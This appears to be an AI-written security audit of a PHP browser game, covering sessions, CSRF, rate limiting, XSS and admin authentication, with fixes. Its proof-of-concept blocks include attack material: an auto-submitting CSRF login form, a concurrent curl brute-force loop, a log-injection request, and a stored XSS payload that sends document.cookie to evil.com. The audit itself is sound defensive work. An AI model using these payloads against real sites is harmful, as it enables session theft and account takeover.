# Security Deep-Dive -- Round 2

**Auditor:** Claude Opus 4.6 (Security Specialist)
**Date:** 2026-03-03
**Scope:** Session management, CSRF, rate limiting, input validation, access controls, admin auth isolation, DB credentials, API auth, auth flow, configuration
**Files reviewed:** 30+ PHP files across includes/, admin/, moderation/, and root

---

## Summary

**Total findings: 22** (Critical: 3, High: 7, Medium: 9, Low: 3)

| Severity | Count | Key Themes |
|----------|-------|------------|
| CRITICAL | 3 | Admin/player shared session namespace, no CSRF on admin login, no password policy |
| HIGH | 7 | Admin sub-pages bypass session_init, rate limiter TOCTOU, CSRF not rotated, legacy MD5 fallback non-constant-time, transformInt injection, no idle timeout on admin, stored XSS in news |
| MEDIUM | 9 | CSP unsafe-inline, no HSTS, bcrypt cost=10, admin shared password, session.cookie_secure conditional, moderation login no CSRF, email regex incomplete, log injection, IP-only rate limiting |
| LOW | 3 | CSRF token lifetime, rate limiter /tmp persistence, .htaccess missing .env protection |

---

## Findings

---

### SEC-R2-001 [CRITICAL] Admin and player sessions share the same PHP session namespace

**File:** `/home/guortates/TVLW/The-Very-Little-War/admin/index.php`:4,17,23
**R1 ref:** SEC-005 (confirmed and expanded)

**Issue:** The admin panel (`admin/index.php`) calls bare `session_start()` at line 4 and stores admin auth as `$_SESSION['motdepasseadmin'] = true` at line 17. Player sessions also use the default PHP session with `$_SESSION['login']`. Both share the same `PHPSESSID` cookie and session file.

This means:
1. A logged-in player who navigates to `/admin/index.php` has their player session available to the admin code path.
2. If a player somehow gains the admin password, the `motdepasseadmin` flag persists in the same session as their player identity -- no isolation.
3. If an admin logs into the admin panel while also logged in as a player, both auth states coexist. Destroying one (player logout) does not destroy the other.

**PoC:**
```
1. Player logs in normally -> session has: login=Alice, session_token=xxx
2. Player navigates to /admin/index.php -> same session, same PHPSESSID
3. Player submits admin password -> session now has BOTH login=Alice AND motdepasseadmin=true
4. Player visits /deconnexion.php -> session_destroy() kills the player session AND the admin flag
   OR: Player does NOT log out -> admin flag persists indefinitely until session gc
5. Worse: if XSS steals the PHPSESSID cookie, attacker gets BOTH player AND admin access
```

**Fix:**
```php
// Option A: Separate session name for admin (recommended)
// In admin/index.php and admin/redirectionmotdepasse.php:
session_name('TVLW_ADMIN');
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_samesite', 'Strict');  // Strict for admin
ini_set('session.cookie_path', '/admin/');      // Scope cookie to admin path
session_start();

// Option B: If separate sessions are too complex, at minimum
// add IP binding and shorter timeout for admin sessions:
if (isset($_SESSION['motdepasseadmin']) && $_SESSION['motdepasseadmin'] === true) {
    if ($_SESSION['admin_ip'] !== $_SERVER['REMOTE_ADDR']) {
        unset($_SESSION['motdepasseadmin']);
        header('Location: index.php');
        exit();
    }
    if (time() - ($_SESSION['admin_last_activity'] ?? 0) > 900) { // 15 min
        unset($_SESSION['motdepasseadmin']);
        header('Location: index.php');
        exit();
    }
    $_SESSION['admin_last_activity'] = time();
}
```

---

### SEC-R2-002 [CRITICAL] No CSRF token on admin login form

**File:** `/home/guortates/TVLW/The-Very-Little-War/admin/index.php`:180-184
**R1 ref:** NEW

**Issue:** The admin login form at line 180-184 does not include a CSRF token field. While the password itself provides some protection, this enables login CSRF attacks. An attacker can construct a page that auto-submits the admin login form with a known password (e.g., from a leaked credential), forcing the admin's browser to authenticate to the admin panel. Combined with finding SEC-R2-001 (shared session), this is especially dangerous.

The moderation login form at `/home/guortates/TVLW/The-Very-Little-War/moderation/index.php`:24-28 has the same issue.

**PoC:**
```html
<!-- Attacker's page: forces victim's browser to log into admin panel -->
<form id="f" action="https://theverylittlewar.com/admin/index.php" method="POST">
  <input type="hidden" name="motdepasseadmin" value="LEAKED_PASSWORD">
</form>
<script>document.getElementById('f').submit();</script>
<!-- If victim is also logged in as a player, the admin flag is set in their existing session -->
```

**Fix:**
```php
// admin/index.php line 180:
} else { ?>
    <form action="index.php" method="post">
        <?php echo csrfField(); ?>
        <label for="motdepasseadmin">Mot de passe : </label>
        <input type="password" name="motdepasseadmin" id="motdepasseadmin" />
        <input type="submit" name="valider" value="Valider" />
    </form>
<?php

// And add CSRF check before password_verify at line 11:
if (isset($_POST['motdepasseadmin'])) {
    csrfCheck(); // Add this line
    if (!rateLimitCheck(...)) { ...
```

Same fix for `moderation/index.php`.

---

### SEC-R2-003 [CRITICAL] No password strength policy -- users can set 1-character passwords

**File:** `/home/guortates/TVLW/The-Very-Little-War/inscription.php`:17-24 and `/home/guortates/TVLW/The-Very-Little-War/compte.php`:33-59
**R1 ref:** NEW

**Issue:** Neither the registration form (`inscription.php`) nor the password change form (`compte.php`) enforces any minimum password length or complexity requirements. A user can register with password "a" or change their password to a single character. The login validation (`validateLogin`) checks username format, but no equivalent `validatePassword` function exists. With bcrypt cost=10, weak passwords are trivially brute-forced even with the 10-per-5-min rate limit (which is IP-based, not account-based, and thus bypassable via IP rotation).

**PoC:**
```
1. Register with login=TestUser, pass=1, pass_confirm=1 -> succeeds
2. Password "1" is hashed with bcrypt, but any attacker who bypasses rate limiting
   (e.g., using multiple IPs) can crack it instantly
3. Even with rate limiting: only 10 attempts per 5 min per IP, but "1" through "9"
   is only 9 attempts -- cracked in one window
```

**Fix:**
```php
// includes/validation.php - add:
function validatePassword($password) {
    if (strlen($password) < 8) return false;
    // Require at least one letter and one number
    if (!preg_match('/[a-zA-Z]/', $password)) return false;
    if (!preg_match('/[0-9]/', $password)) return false;
    return true;
}

// inscription.php line 24, after password match check:
if ($passInput != $passConfirm) {
    $erreur = 'Les deux mots de passe sont differents.';
} elseif (!validatePassword($passInput)) {
    $erreur = 'Le mot de passe doit contenir au moins 8 caracteres avec des lettres et des chiffres.';
} else {
    // ... existing validation
}

// compte.php line 56, after password match check:
} elseif (!validatePassword($newPassword)) {
    $erreur = 'Le mot de passe doit contenir au moins 8 caracteres avec des lettres et des chiffres.';
} else {
    // ... existing hash update
}
```

---

### SEC-R2-004 [HIGH] Admin sub-pages call bare session_start() bypassing session_init.php hardening

**File:** `/home/guortates/TVLW/The-Very-Little-War/admin/redirectionmotdepasse.php`:2 and `/home/guortates/TVLW/The-Very-Little-War/admin/index.php`:4
**R1 ref:** SEC-005 (expanded)

**Issue:** `admin/redirectionmotdepasse.php` line 2 and `admin/index.php` line 4 call bare `session_start()` without the security hardening from `session_init.php`. This means sessions initiated from the admin panel lack:
- `cookie_httponly` flag (JavaScript can read admin session cookies)
- `use_strict_mode` (session fixation via attacker-chosen session IDs)
- `cookie_samesite` (no SameSite protection)

The `moderation/index.php` also calls bare `session_start()` at line 2, while `moderation/mdp.php` correctly uses `session_init.php`.

**PoC:**
```
1. Admin navigates directly to /admin/index.php (first visit, no existing session)
2. session_start() creates session without httponly/samesite flags
3. XSS anywhere on the domain can read document.cookie and steal the admin PHPSESSID
4. Attacker with a session fixation vector can pre-set PHPSESSID before admin logs in
```

**Fix:**
```php
// admin/index.php: Replace line 4
// OLD: session_start();
// NEW:
require_once(__DIR__ . '/../includes/session_init.php');

// admin/redirectionmotdepasse.php: Replace line 2
// OLD: session_start();
// NEW:
require_once(__DIR__ . '/../includes/session_init.php');

// moderation/index.php: Replace line 2
// OLD: session_start();
// NEW:
require_once(__DIR__ . '/../includes/session_init.php');
```

---

### SEC-R2-005 [HIGH] Rate limiter has TOCTOU race condition -- can be bypassed with concurrent requests

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/rate_limiter.php`:11-37
**R1 ref:** NEW

**Issue:** The rate limiter reads the JSON file, checks the count, then writes back. Between the `file_get_contents` (line 22) and `file_put_contents` (line 36), a concurrent request can also read the old count and pass the check. With 10 concurrent requests fired simultaneously, all 10 will read the same count (say 9/10), all pass the check, and all write back -- effectively allowing 19 attempts instead of 10.

The `LOCK_EX` flag on `file_put_contents` only locks during the write, not during the read-check-write cycle.

**PoC:**
```bash
# Fire 20 concurrent login attempts -- all read count=0 simultaneously
for i in $(seq 1 20); do
  curl -s -X POST 'https://theverylittlewar.com/index.php' \
    -d 'loginConnexion=Admin&passConnexion=guess'$i'&csrf_token=VALID_TOKEN' &
done
wait
# Result: All 20 pass the rate limit check because they all read count=0
```

**Fix:**
```php
function rateLimitCheck($identifier, $action, $maxAttempts, $windowSeconds) {
    $dir = RATE_LIMIT_DIR;
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }

    $file = $dir . '/' . md5($identifier . '_' . $action) . '.json';
    $now = time();

    // Use exclusive file lock for the entire read-check-write cycle
    $fp = fopen($file, 'c+');
    if (!$fp) return true; // fail open on I/O error (consider fail closed)

    if (!flock($fp, LOCK_EX)) {
        fclose($fp);
        return true;
    }

    $contents = stream_get_contents($fp);
    $data = $contents ? json_decode($contents, true) : [];
    $attempts = is_array($data) ? array_filter($data, function($t) use ($now, $windowSeconds) {
        return ($now - $t) < $windowSeconds;
    }) : [];

    if (count($attempts) >= $maxAttempts) {
        flock($fp, LOCK_UN);
        fclose($fp);
        return false;
    }

    $attempts[] = $now;
    ftruncate($fp, 0);
    rewind($fp);
    fwrite($fp, json_encode(array_values($attempts)));
    fflush($fp);
    flock($fp, LOCK_UN);
    fclose($fp);
    return true;
}
```

---

### SEC-R2-006 [HIGH] CSRF token never rotated after use -- replay attacks possible

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/csrf.php`:6-10,17-22
**R1 ref:** NEW

**Issue:** The CSRF token is generated once per session (line 7-8: `if (empty($_SESSION['csrf_token']))`) and never regenerated after successful verification. The `csrfVerify()` function at line 17 validates the token but does not consume/rotate it. This means a valid CSRF token captured once (e.g., from page source, logs, or a reflected XSS) can be replayed indefinitely for the lifetime of the session (up to 1 hour idle timeout + 30-min regeneration window).

**PoC:**
```
1. Player loads any page with a form -> CSRF token is in HTML source
2. Attacker captures token via shoulder surfing, cache, or network sniff on HTTP
3. Attacker can replay this token for ALL forms (don, marche, attaquer, compte)
   for the entire session lifetime, even across session_regenerate_id calls
   (because session data including csrf_token is preserved across regeneration)
```

**Fix:**
```php
// includes/csrf.php - rotate token after successful verification:
function csrfVerify() {
    if (empty($_POST['csrf_token']) || empty($_SESSION['csrf_token'])) {
        return false;
    }
    $valid = hash_equals($_SESSION['csrf_token'], $_POST['csrf_token']);
    if ($valid) {
        // Rotate token after successful use to prevent replay
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $valid;
}
```

Note: This is a defense-in-depth measure. The per-session token is acceptable for most threat models, but token rotation significantly raises the bar.

---

### SEC-R2-007 [HIGH] Legacy MD5 password comparison is not constant-time

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/basicpublicphp.php`:49
**R1 ref:** NEW

**Issue:** Line 49 uses `hash_equals(md5($passwordInput), $storedHash)` for legacy MD5 comparison. While `hash_equals` is constant-time, the `md5()` call itself is a red flag -- this code path exists as a migration fallback and still accepts MD5-hashed passwords. Any account still using an MD5 hash (not yet migrated to bcrypt) has a weak password hash that can be cracked trivially if the database is compromised.

Additionally, at `/home/guortates/TVLW/The-Very-Little-War/compte.php`:50, the password change form has `md5($currentPassword) === $storedHash` which uses `===` (NOT `hash_equals`), making it vulnerable to timing attacks that can leak the hash character by character.

**PoC:**
```
# Timing attack on compte.php password change:
# The === comparison short-circuits on first mismatch
# By measuring response times for md5('a') vs md5('b') vs md5('c')...
# an attacker can determine if the stored hash starts with each prefix
# This requires many measurements but is a proven attack vector

# Database leak scenario:
# Any MD5 hash in the membre.pass_md5 column can be rainbow-tabled instantly
# MD5 has no salt, so all common passwords are pre-computed
```

**Fix:**
```php
// compte.php line 50 - replace:
// OLD: } elseif (md5($currentPassword) === $storedHash) {
// NEW:
} elseif (hash_equals(md5($currentPassword), $storedHash)) {

// Additionally, add a deadline for MD5 migration removal.
// After X months, remove the MD5 fallback entirely and force password resets
// for any accounts still on MD5 hashes (hashes not starting with '$2y$').
```

---

### SEC-R2-008 [HIGH] transformInt() allows arbitrary large numbers -- potential integer overflow / resource exhaustion

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/display.php`:341-352
**R1 ref:** NEW

**Issue:** `transformInt()` performs regex replacement of suffix letters (K, M, G, T, P, E, Z, Y) with zeros. It accepts any input string and performs no bounds checking. A user submitting "1Y" gets "1000000000000000000000000" (1 septillion), and "999Y" yields a number with 27 digits. This value is then used in database operations (e.g., `don.php` line 9 uses it for energy donation, `marche.php` for market amounts).

While `marche.php` wraps the result in `intval()` (which caps at PHP_INT_MAX on 64-bit: ~9.2e18), `don.php` does NOT -- the raw string goes into a prepared statement with type 'd' (double), which can represent extremely large numbers.

**PoC:**
```
POST /don.php
energieEnvoyee=999Y&csrf_token=VALID

# transformInt('999Y') = '999000000000000000000000000'
# This is passed to SQL as a double, potentially:
# - Causing alliance energy to become astronomically high
# - Creating negative values via overflow in some DB arithmetic
# - Bypassing the "energie < energieEnvoyee" check if float precision is lost
```

**Fix:**
```php
// includes/display.php - add bounds check after transform:
function transformInt($nombre)
{
    $nombre = preg_replace('#K#i', '000', $nombre);
    $nombre = preg_replace('#M#i', '000000', $nombre);
    $nombre = preg_replace('#G#i', '000000000', $nombre);
    $nombre = preg_replace('#T#i', '000000000000', $nombre);
    $nombre = preg_replace('#P#i', '000000000000000', $nombre);
    $nombre = preg_replace('#E#i', '000000000000000000', $nombre);
    $nombre = preg_replace('#Z#i', '000000000000000000000', $nombre);
    $nombre = preg_replace('#Y#i', '000000000000000000000000', $nombre);

    // Clamp to safe integer range to prevent overflow exploits
    if (is_numeric($nombre)) {
        $nombre = min(max(intval($nombre), 0), PHP_INT_MAX);
    }
    return $nombre;
}

// Additionally, all callers should use intval() on the result:
// don.php line 9:
$_POST['energieEnvoyee'] = intval(transformInt($_POST['energieEnvoyee']));
```

---

### SEC-R2-009 [HIGH] No idle/absolute timeout for admin sessions

**File:** `/home/guortates/TVLW/The-Very-Little-War/admin/index.php`:23 and `/home/guortates/TVLW/The-Very-Little-War/admin/redirectionmotdepasse.php`:1-7
**R1 ref:** SEC-005 (expanded)

**Issue:** Once `$_SESSION['motdepasseadmin']` is set to `true`, it persists until the PHP session itself expires (gc_maxlifetime=3600 from session_init.php, but admin pages don't use session_init.php, so they get PHP's default of 1440 seconds / 24 minutes). There is no idle timeout check and no absolute timeout. The `basicprivatephp.php` idle timeout (line 46-51) only applies to player pages, not admin pages.

An admin who walks away from their computer remains authenticated indefinitely (as long as the session file exists). On shared computers or compromised browsers, this is a significant exposure window.

**PoC:**
```
1. Admin authenticates at /admin/index.php
2. Admin walks away (does not close browser)
3. Hours later, anyone with access to the same browser can perform admin actions
4. Since admin pages use bare session_start() (not session_init.php),
   gc_maxlifetime defaults to php.ini default (often 1440s but unreliable)
```

**Fix:**
```php
// admin/redirectionmotdepasse.php - add after session check:
require_once(__DIR__ . '/../includes/session_init.php');
include_once(__DIR__ . '/../includes/constantesBase.php');

if (!isset($_SESSION['motdepasseadmin']) || $_SESSION['motdepasseadmin'] !== true) {
    header('Location: index.php');
    exit();
}

// Idle timeout: 15 minutes for admin
if (isset($_SESSION['admin_last_activity']) && (time() - $_SESSION['admin_last_activity']) > 900) {
    unset($_SESSION['motdepasseadmin']);
    header('Location: index.php');
    exit();
}
$_SESSION['admin_last_activity'] = time();

// Absolute timeout: 2 hours max admin session
if (isset($_SESSION['admin_login_time']) && (time() - $_SESSION['admin_login_time']) > 7200) {
    unset($_SESSION['motdepasseadmin']);
    header('Location: index.php');
    exit();
}
```

---

### SEC-R2-010 [HIGH] Admin news content stored and displayed as raw HTML -- stored XSS

**File:** `/home/guortates/TVLW/The-Very-Little-War/admin/listenews.php`:45-57
**R1 ref:** NEW

**Issue:** The admin news creation form at `listenews.php` line 45-57 stores `$_POST['titre']` and `$_POST['contenu']` directly into the `news` table without sanitization (lines 53, 56). The prepared statements prevent SQL injection, but the content itself may contain JavaScript.

When news items are displayed on the player-facing pages, the content is rendered. If the news display code does not escape HTML, this creates a stored XSS vector. Even though admin creates the content, this matters because: (a) a compromised admin account can inject XSS targeting all players, (b) the admin login has no CSRF (SEC-R2-002), meaning an external attacker could potentially inject news via CSRF if they know the admin password.

The `basicprivatephp.php` line 227 shows news content is rendered with `htmlspecialchars()` for `$vainqueurManche` but the `$contenu` variable in news INSERT is raw HTML. The news display page would need to be checked, but the storage of unescaped HTML is the root cause.

**PoC:**
```
1. Admin creates news with titre="Test" and contenu='<script>fetch("https://evil.com/steal?c="+document.cookie)</script>'
2. News is stored as-is in the database
3. When displayed to players, if not escaped, the script executes
4. Even if currently escaped at display time, this is a latent vulnerability --
   any future code change that renders news without escaping will activate it
```

**Fix:**
```php
// admin/listenews.php line 45-57, sanitize on storage:
if (isset($_POST['titre']) and isset($_POST['contenu'])) {
    $titre = htmlspecialchars($_POST['titre'], ENT_QUOTES, 'UTF-8');
    $contenu = htmlspecialchars($_POST['contenu'], ENT_QUOTES, 'UTF-8');
    // Or better: use a whitelist-based HTML sanitizer if rich text is needed
    // e.g., HTMLPurifier
```

---

### SEC-R2-011 [MEDIUM] CSP header allows 'unsafe-inline' for both script-src and style-src

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess`:7
**R1 ref:** INFRA-R1-001 (confirmed)

**Issue:** The Content-Security-Policy header at line 7 includes `'unsafe-inline'` in both `script-src` and `style-src`. This effectively negates CSP's XSS protection -- any XSS vector that injects inline JavaScript will execute unimpeded. CSP without removal of `unsafe-inline` provides only marginal security benefit for XSS prevention.

**PoC:**
```
If any reflected or stored XSS exists, the injected <script>alert(1)</script>
executes because CSP explicitly allows inline scripts via 'unsafe-inline'.
CSP provides zero additional protection in this configuration.
```

**Fix:**
```
# Phase 1: Add nonce-based CSP (requires code changes to all inline scripts)
# Generate nonce in PHP, pass to CSP header and to all <script> tags
# Phase 2: Remove 'unsafe-inline' once all inline scripts use nonces

# Immediate improvement -- at minimum remove 'unsafe-inline' from script-src
# and add nonces, keeping 'unsafe-inline' for style-src temporarily:
Header set Content-Security-Policy "default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'self'"
```

Note: Removing `unsafe-inline` from script-src will require refactoring all inline `<script>` tags (e.g., `deconnexion.php` line 37, `inscription.php` line 41, `compte.php` line 10) into external files or adding nonce attributes.

---

### SEC-R2-012 [MEDIUM] No HSTS header -- SSL stripping possible once HTTPS is enabled

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess`:1-8
**R1 ref:** INFRA-R1-003 (confirmed)

**Issue:** No `Strict-Transport-Security` header is configured. Once HTTPS is enabled (planned via Let's Encrypt), browsers will not remember to use HTTPS. An attacker performing a man-in-the-middle attack can intercept the first HTTP request and downgrade the connection (SSL stripping), capturing session cookies and credentials.

**Fix:**
```apache
# Add to .htaccess inside <IfModule mod_headers.c>:
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
```

---

### SEC-R2-013 [MEDIUM] bcrypt cost=10 is PHP default -- below OWASP recommendation

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/player.php`:54 and `/home/guortates/TVLW/The-Very-Little-War/includes/basicpublicphp.php`:52
**R1 ref:** SEC-003 (confirmed)

**Issue:** All `password_hash()` calls use `PASSWORD_DEFAULT` which defaults to bcrypt with cost=10. OWASP 2024 recommends cost=12 as a minimum. Cost=10 means each hash takes approximately 100ms; cost=12 takes approximately 400ms, providing 4x more resistance to offline brute-force attacks in the event of a database breach.

The admin password hash in `constantesBase.php` line 54 also uses cost=10 (`$2y$10$...`).

**Fix:**
```php
// All password_hash() calls -- replace:
// OLD: password_hash($password, PASSWORD_DEFAULT);
// NEW:
password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

// Also regenerate the admin password hash with cost=12:
// php -r "echo password_hash('ADMIN_PASSWORD', PASSWORD_BCRYPT, ['cost' => 12]);"
// Update constantesBase.php ADMIN_PASSWORD_HASH with the new hash
```

---

### SEC-R2-014 [MEDIUM] Admin uses shared password -- no individual admin accounts or audit trail

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/constantesBase.php`:53-55
**R1 ref:** ADMIN-R1-001 (confirmed)

**Issue:** Both `admin/index.php` and `moderation/index.php` authenticate against the same `ADMIN_PASSWORD_HASH` constant. There is no concept of individual admin users, no way to distinguish which admin performed an action, and no way to revoke access for a specific person without changing the shared password (which affects all admins and moderators).

The logging at `admin/index.php` line 18 records "Admin login successful" but does not record WHO logged in, because there is no identity.

**Fix:**
```
Short term:
- Store admin credentials in a database table (admin_users) with individual
  bcrypt-hashed passwords and usernames
- Log admin username with every action for audit trail
- Support multiple admin accounts with different privilege levels

Long term:
- Implement 2FA (TOTP) for admin access
- Add admin action audit log table
```

---

### SEC-R2-015 [MEDIUM] session.cookie_secure is conditional on HTTPS detection

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/session_init.php`:8
**R1 ref:** SEC-002 (confirmed)

**Issue:** Line 8 sets `session.cookie_secure` based on `!empty($_SERVER['HTTPS'])`. This means:
1. On HTTP, the cookie is sent without the Secure flag, making it stealable via MITM.
2. Behind a reverse proxy that terminates TLS, `$_SERVER['HTTPS']` may not be set even though the connection is HTTPS (depends on proxy configuration).
3. Once HTTPS is enabled and enforced, this conditional is unnecessary and could cause issues if the HTTPS detection fails.

**Fix:**
```php
// Once HTTPS is enabled, hardcode to 1:
ini_set('session.cookie_secure', 1);

// If needing to support HTTP temporarily for development:
// Use an environment variable or config constant:
ini_set('session.cookie_secure', getenv('TVLW_FORCE_HTTPS') ? 1 : (!empty($_SERVER['HTTPS']) ? 1 : 0));
```

---

### SEC-R2-016 [MEDIUM] Admin login form lacks CSRF protection (moderation panel)

**File:** `/home/guortates/TVLW/The-Very-Little-War/moderation/index.php`:24-28
**R1 ref:** NEW (companion to SEC-R2-002)

**Issue:** Same as SEC-R2-002 but for the moderation panel. The login form at lines 24-28 has no `csrfField()` and the login handler at line 10 does not call `csrfCheck()`. The moderation panel has powerful capabilities including: giving resources to players (line 74-149), modifying forum topics, adding "bombe" points.

**PoC:** Same as SEC-R2-002 but targeting `/moderation/index.php`.

**Fix:** Same pattern as SEC-R2-002.

---

### SEC-R2-017 [MEDIUM] Email validation regex in compte.php is more restrictive than FILTER_VALIDATE_EMAIL

**File:** `/home/guortates/TVLW/The-Very-Little-War/compte.php`:76
**R1 ref:** NEW

**Issue:** The email change handler at `compte.php` line 76 uses `preg_match("#^[a-z0-9._-]+@[a-z0-9._-]{2,}\.[a-z]{2,4}$#", ...)` which:
1. Only allows lowercase (rejects "User@Example.COM" which is valid)
2. Limits TLD to 2-4 characters (rejects .technology, .consulting, etc.)
3. Does not match the `validateEmail()` function from `validation.php` which uses `FILTER_VALIDATE_EMAIL`

Meanwhile, `inscription.php` uses `validateEmail()` (which uses `FILTER_VALIDATE_EMAIL`). This inconsistency means a user can register with a valid email but then be unable to change it to another valid email.

**Fix:**
```php
// compte.php line 76 - replace regex with:
if (validateEmail($_POST['changermail'])) {
    // ... rest of email change logic
}
```

---

### SEC-R2-018 [MEDIUM] Log injection possible via user-controlled session login

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/logger.php`:26
**R1 ref:** NEW

**Issue:** The `gameLog()` function at line 26 reads `$_SESSION['login']` and embeds it directly into the log line without sanitization. While usernames are validated at registration to be alphanumeric (3-20 chars), the `$message` and `$context` parameters are also embedded without newline stripping.

If any logging call passes user-controlled data in the message or context that contains newline characters, an attacker can inject fake log entries. For example, the login failure logging at `basicpublicphp.php`:73 logs the `$loginInput` which has been processed through `ucfirst(mb_strtolower(trim()))` but not stripped of newlines.

**PoC:**
```
POST /index.php
loginConnexion=test%0A[2026-03-03 12:00:00] [INFO] [AUTH] [admin@1.2.3.4] Login successful&passConnexion=x

# The login input becomes "test\n[2026-03-03 12:00:00] [INFO] [AUTH] [admin@1.2.3.4] Login successful"
# After ucfirst/mb_strtolower it becomes "Test\n[2026-03-03..." (newline preserved)
# The log entry appears as two separate lines, the second looking like a legitimate admin login
```

**Fix:**
```php
// includes/logger.php line 26-30, sanitize all components:
$login = str_replace(["\n", "\r", "\t"], '', $_SESSION['login'] ?? 'anonymous');
$ip = str_replace(["\n", "\r", "\t"], '', $_SERVER['REMOTE_ADDR'] ?? 'unknown');
$message = str_replace(["\n", "\r"], ' ', $message);
$contextStr = !empty($context) ? ' | ' . str_replace(["\n", "\r"], ' ', json_encode($context)) : '';
```

---

### SEC-R2-019 [MEDIUM] Rate limiting is IP-based only -- no account-based throttling

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/basicpublicphp.php`:25 and `/home/guortates/TVLW/The-Very-Little-War/includes/rate_limiter.php`:11
**R1 ref:** NEW

**Issue:** Login rate limiting uses only the client IP address as the identifier (line 25: `$_SERVER['REMOTE_ADDR']`). This has two weaknesses:

1. **IP rotation bypass:** An attacker using a botnet or rotating proxy can attempt 10 passwords per IP, multiplied by hundreds of IPs. This enables distributed brute-force attacks with effectively no rate limit.

2. **Shared IP lockout (DoS):** Users behind a corporate NAT or VPN share one IP. An attacker can lock out all users from that IP by exhausting the 10-attempt limit, creating a denial-of-service for legitimate users.

No account-based rate limiting exists -- there is no limit on how many total attempts can be made against a single username across different IPs.

**Fix:**
```php
// basicpublicphp.php - add dual rate limiting (both IP and account):
$loginInput = ucfirst(mb_strtolower(trim($_POST['loginConnexion'])));

// Per-IP rate limit (existing)
if (!rateLimitCheck($_SERVER['REMOTE_ADDR'], 'login', 10, 300)) {
    die('<p>Trop de tentatives de connexion. Reessayez dans quelques minutes.</p>');
}

// Per-account rate limit (new) -- 5 attempts per 15 minutes per username
if (!rateLimitCheck('account_' . $loginInput, 'login', 5, 900)) {
    die('<p>Trop de tentatives pour ce compte. Reessayez dans 15 minutes.</p>');
}
```

---

### SEC-R2-020 [LOW] CSRF token has unlimited lifetime within session

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/csrf.php`:6-10
**R1 ref:** NEW

**Issue:** The CSRF token is generated once (line 7: `if (empty($_SESSION['csrf_token']))`) and lives for the entire session duration (up to 1 hour idle timeout). This is a long window during which a leaked token remains valid. Best practice is to rotate tokens every N minutes or after each use (see SEC-R2-006).

**Fix:** Addressed by the fix in SEC-R2-006 (rotate after each use). Additionally:
```php
function csrfToken() {
    // Regenerate token every 30 minutes
    if (empty($_SESSION['csrf_token']) ||
        !isset($_SESSION['csrf_token_time']) ||
        (time() - $_SESSION['csrf_token_time']) > 1800) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        $_SESSION['csrf_token_time'] = time();
    }
    return $_SESSION['csrf_token'];
}
```

---

### SEC-R2-021 [LOW] Rate limiter uses /tmp -- data lost on reboot, writable by all processes

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/rate_limiter.php`:8
**R1 ref:** NEW

**Issue:** Rate limit data is stored in `/tmp/tvlw_rates/` (line 8). This directory:
1. Is cleared on system reboot, resetting all rate limits
2. Is world-writable, so any process on the server can delete or modify rate limit files
3. Cannot be shared across multiple web servers if the application is ever scaled

A local attacker with shell access (or any other PHP application on the same server) can simply `rm /tmp/tvlw_rates/*` to reset all rate limits.

**Fix:**
```php
// Move to a directory owned by the web server, not /tmp:
define('RATE_LIMIT_DIR', __DIR__ . '/../data/rates');

// Set permissions:
// mkdir -p data/rates && chown www-data:www-data data/rates && chmod 700 data/rates

// Add to .htaccess to block web access:
// <FilesMatch "^data/">
//     Require all denied
// </FilesMatch>

// Long-term: migrate to database-backed or Redis-backed rate limiting
```

---

### SEC-R2-022 [LOW] .htaccess FilesMatch does not block .env files

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess`:14
**R1 ref:** NEW

**Issue:** The FilesMatch at line 14 blocks `.(sql|psd|md|json|xml|lock|gitignore)$` files, and the hidden files rule at line 25 blocks files starting with `.`. However, the hidden files rule uses `^\.` which matches `.env`, `.env.example`, `.htaccess`, etc. So `.env` IS protected by the hidden files rule. This finding is LOW because the protection exists but is indirect -- if someone were to remove the hidden files rule, `.env` would be exposed.

**Fix:**
```apache
# Explicitly list .env in the sensitive files pattern for defense-in-depth:
<FilesMatch "\.(sql|psd|md|json|xml|lock|gitignore|env|log|bak|old|orig|swp)$">
```

---

## Verification Summary

### What R1 got right (confirmed):
- **SEC-005:** Admin/player shared session namespace -- CONFIRMED and expanded (SEC-R2-001, SEC-R2-004, SEC-R2-009)
- **SEC-003:** bcrypt cost=10 -- CONFIRMED (SEC-R2-013)
- **SEC-002:** Conditional cookie_secure -- CONFIRMED (SEC-R2-015)
- **INFRA-R1-001:** CSP unsafe-inline -- CONFIRMED (SEC-R2-011)
- **INFRA-R1-003:** Missing HSTS -- CONFIRMED (SEC-R2-012)
- **ADMIN-R1-001:** Shared admin password -- CONFIRMED (SEC-R2-014)

### What R1 missed (new findings):
- **SEC-R2-002:** No CSRF on admin login forms (CRITICAL)
- **SEC-R2-003:** No password strength policy (CRITICAL)
- **SEC-R2-005:** Rate limiter TOCTOU race (HIGH)
- **SEC-R2-006:** CSRF token never rotated (HIGH)
- **SEC-R2-007:** MD5 fallback non-constant-time comparison (HIGH)
- **SEC-R2-008:** transformInt arbitrary large numbers (HIGH)
- **SEC-R2-010:** Admin news stored as raw HTML (HIGH)
- **SEC-R2-016:** Moderation login lacks CSRF (MEDIUM)
- **SEC-R2-017:** Email validation inconsistency (MEDIUM)
- **SEC-R2-018:** Log injection (MEDIUM)
- **SEC-R2-019:** IP-only rate limiting (MEDIUM)

### What was well-implemented (positive findings):
- **Session token validation:** `basicprivatephp.php` line 12 uses `hash_equals()` for timing-safe session token comparison -- correct.
- **Session regeneration:** 30-minute periodic regeneration and regeneration on login -- good practice.
- **Session invalidation on logout:** `deconnexion.php` properly clears DB token, calls `session_unset()`, `session_destroy()`, and clears the cookie.
